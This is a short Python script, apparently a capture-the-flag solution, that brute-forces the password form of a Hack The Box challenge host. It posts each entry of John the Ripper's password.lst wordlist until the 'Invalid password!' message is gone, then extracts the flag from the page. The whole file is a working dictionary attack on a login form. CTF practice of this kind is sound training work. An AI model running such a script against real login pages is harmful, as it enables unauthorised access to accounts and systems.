#!/usr/local/bin/python3

import requests
import re

url = 'http://docker.hackthebox.eu:34414'

s = requests.session()

list = open('/usr/local/share/john/password.lst', 'r')

for password in list:
    response = s.post(url, data={'password': password.replace('\n', '')})
    print('trying ' + password.replace('\n', ''))
    if "Invalid password!" not in response.text:
        print('password is ' + password)
        content = response.text
        flag = re.findall("<h1 style='color: #fff;'>(.*)</h1><script ", content)[0]
        print(flag)
        break
